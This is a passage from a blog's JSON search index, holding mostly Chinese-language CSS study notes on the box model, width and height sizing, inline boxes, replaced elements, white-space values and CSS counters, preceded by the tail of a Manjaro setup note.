-S plank sudo pacman -S variety KDE 美化和优化 美化 ","date":"2019-01-10","objectID":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/:8:0","tags":["Manjaro"],"title":"Manjaro安装后配置","uri":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/"},{"categories":null,"content":"每元素都有一个外在盒子和容器盒子(内在盒子) 外在盒子负责元素是否一行显示 容器盒子负责元素的宽高、内容呈现 块级元素 外在盒子是 block 的元素 都有主块级盒子 list-item 还有一个附加盒子(IE 伪元素不支持附加盒子) ","date":"2018-08-11","objectID":"/2018/08/css%E7%AC%94%E8%AE%B0/:0:0","tags":["CSS"],"title":"CSS笔记","uri":"/2018/08/css%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"width : auto 充分利用可用空间，块级元素默认 100% 收缩与包裹。代表是浮动、绝对定位、inline-block、table 元素 收缩到最小 超出容器限制。内容很长的连续英文和数字，或者设置了 white-space:nowrap （除了第一个是外部尺寸，其余都是内部尺寸。分别对应以下的外部尺寸和内部尺寸） 外部尺寸 正常 width 是 100% 格式化宽度 出现在 position 为 absolute 和 fixed 元素中。 默认绝对定位元素宽度是由内部尺寸决定，除了当 left 和 right 或 top 和 bottom 同时出现时，其宽度相对于最近的具有定位特性的祖先元素计算 内部尺寸 包裹性 顾名思义，尺寸由内部元素决定，单永远小于包含块容器尺寸 首选最小宽度 当外部容器盒子宽度为 0，内部的内联盒子就是首选最小宽度 中文，为单个汉子宽度 西文遇到空格、-、?、其他非英文字符，就会换行 类似图片这样的替换元素，就是元素本身的宽度 最大宽度 等同于 包裹性 元素设置 white-sapce:nowrap 后的宽度 是最大的连续内联盒子的宽度 height 如何让元素支持 height:100% 效果？ 设置父元素高度 使用绝对定位 绝对定位的宽高百分比是相对于 padding box，其他是相对于 content box min-width/height 和 max-width/height min-width/min-height 初始值是 auto，max-* 是 none max-width 会覆盖width，即使是width:xpx !important min-width会覆盖max-width 内联元素 外在盒子是内联盒子的元素 ","date":"2018-08-11","objectID":"/2018/08/css%E7%AC%94%E8%AE%B0/:1:0","tags":["CSS"],"title":"CSS笔记","uri":"/2018/08/css%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"内联盒子模型 内容区域 围绕文字的盒子 内联盒子 是元素外在盒子 行框盒子 每一行就是一个行框盒子 包含盒子（包含块） 由一行一行的行框盒子组成，是父元素外面的盒子 ","date":"2018-08-11","objectID":"/2018/08/css%E7%AC%94%E8%AE%B0/:1:1","tags":["CSS"],"title":"CSS笔记","uri":"/2018/08/css%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"幽灵空白节点（strut） 内联元素的解析就像每个行框盒子前面都有一个空白节点，宽度为 0 ","date":"2018-08-11","objectID":"/2018/08/css%E7%AC%94%E8%AE%B0/:1:2","tags":["CSS"],"title":"CSS笔记","uri":"/2018/08/css%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"替换元素 内容可替换的元素，如： \u003cimg\u003e,\u003cobject\u003e,\u003cvideo\u003e,\u003ciframe\u003e,\u003cinput\u003e,\u003ctextarea\u003e,\u003cselect\u003e 有如下特性： 外观不受 css 影响 有自己的尺寸 很多 css 属性有自己的一套表现规则。如 vertical-align ，替换元素的baseline是元素的下边缘，非替换元素是x的下边缘 替换元素默认 dispay 值 都是inline或inline-block 主要记: \u003cimg\u003e是inline \u003cinput\u003e是inline-block（火狐是 inline） \u003cinput\u003e和\u003cbutton\u003e区别： 前者white-space是 pre，后者是 normal white-space: normal (默认) 连续的空白符会被合并，换行符会被当作空白符来处理。填充 line 盒子时，必要的话会换行 nowrap 和 normal 一样，连续的空白符会被合并。但文本内的换行无效 pre 连续的空白符会被保留。在遇到换行符或者\u003cbr\u003e元素时才会换行。 pre-wrap 连续的空白符会被保留。在遇到换行符或者\u003cbr\u003e元素，或者需要为了填充 line 盒子时才会换行。 pre-line 连续的空白符会被合并。在遇到换行符或者\u003cbr\u003e元素，或者需要为了填充 line 盒子时会换行。 换行符 空格和 tap 文字转行 normal 空白符 合并 yes nowrap 空白符 合并 no pre 换行 保留 no pre-wrap 换行 保留 yes pre-line 换行 合并 yes ","date":"2018-08-11","objectID":"/2018/08/css%E7%AC%94%E8%AE%B0/:1:3","tags":["CSS"],"title":"CSS笔记","uri":"/2018/08/css%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"替换元素尺寸 固有尺寸 原本尺寸，无法改变 HTML 尺寸 通过 HTML 属性改变的尺寸，如： img的width,height input的size属性 textarea的cols和rows CSS 尺寸 通过 CSS 改变的尺寸 从下都上，优先级递减 Firefox 中没有src属性的img元素是inline元素 css 之所以可以改变图片的大小，是因为图片中的 comtent 默认的object-fit是fill ","date":"2018-08-11","objectID":"/2018/08/css%E7%AC%94%E8%AE%B0/:1:4","tags":["CSS"],"title":"CSS笔记","uri":"/2018/08/css%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"替换元素离非替换元素有多远？ 只隔了一个src Firefox 直接就行，Chrome 要有一个不为空的 alt 值 只隔了一个content属性 counter:url('...') ","date":"2018-08-11","objectID":"/2018/08/css%E7%AC%94%E8%AE%B0/:1:5","tags":["CSS"],"title":"CSS笔记","uri":"/2018/08/css%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"content 计数器 counter-reset 给计数器起名，和从那个数字开始计数 .xxx{ counter-reset:name 2} 名字就是 name ，从 2 开始，默认 0，数字不合符当 0 处理 可以多个计数器同时命名 .xxx{ counter-reset:name 2 name2 3} counter-increment key 为 counter-reset 的名字，值是每次增加的值，没有则默认 1，也可以有多个 key 用空格如同 counter-reset .counter { counter-reset: szx 2; counter-increment: szx 1; } .counter::before { content: counter(szx); } counter-increment 在父元素或子元素都有效 方法counter( ) / counters( ) counter(name[,style]) style 支持的值就是list-style-type支持的值，作用是增减可以是英文字母或罗马文 一个 content 可以有多个 content( )方法 counters(name,string[,style]) string 必须，表示子序号的链接字符,style 同上 reset 不要和 counter 同级 ","date":"2018-08-11","objectID":"/2018/08/css%E7%AC%94%E8%AE%B0/:2:0","tags":["CSS"],"title":"CSS笔记","uri":"/2018/08/css%E7%AC%94%E8%AE%B0/"}]